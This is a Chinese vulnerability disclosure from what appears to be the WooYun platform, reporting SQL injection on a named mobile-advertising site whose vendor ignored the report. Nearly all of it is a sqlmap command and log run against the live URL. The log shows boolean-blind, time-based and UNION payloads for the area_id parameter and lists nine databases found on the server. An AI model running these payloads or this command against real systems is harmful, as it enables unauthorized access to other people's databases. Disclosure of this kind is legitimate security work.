wybug_title: 布丁移动广告sql注射涉及9库&多处配置不当
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-10-15：	细节已通知厂商并且等待厂商处理中									2015-10-20：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  sql注射http://a.bdmob.cn/topicslist.php?area_id=26


C:\>sqlmap.py -u "http://a.bdmob.cn/topicslist.php?area_id=26" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150823}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:14:04[22:14:05] [INFO] resuming back-end DBMS 'mysql'[22:14:06] [INFO] testing connection to the target URL[22:14:08] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDSdo you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N]sqlmap resumed the following injection point(s) from stored session:---Parameter: area_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: area_id=26 AND 7133=7133    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: area_id=26 AND (SELECT * FROM (SELECT(SLEEP(5)))wLEg)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: area_id=-6254 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a6a71,0x574f4f455273444c5042,0x716a787071),NULL,NULL,NULL,NULL,NULL-----[22:14:18] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[22:14:18] [INFO] fetching database names[22:14:18] [INFO] the SQL query used returns 9 entries[22:14:18] [INFO] resumed: information_schema[22:14:18] [INFO] resumed: 4493[22:14:18] [INFO] resumed: apkzn[22:14:18] [INFO] resumed: appcms[22:14:18] [INFO] resumed: mysql[22:14:18] [INFO] resumed: sex_market[22:14:18] [INFO] resumed: tptx[22:14:18] [INFO] resumed: web_wx[22:14:18] [INFO] resumed: weixin10available databases [9]:[*] 4493[*] apkzn[*] appcms[*] information_schema[*] mysql[*] sex_market[*] tptx[*] web_wx[*] weixin10[22:14:18] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\a.bdmob.cn'
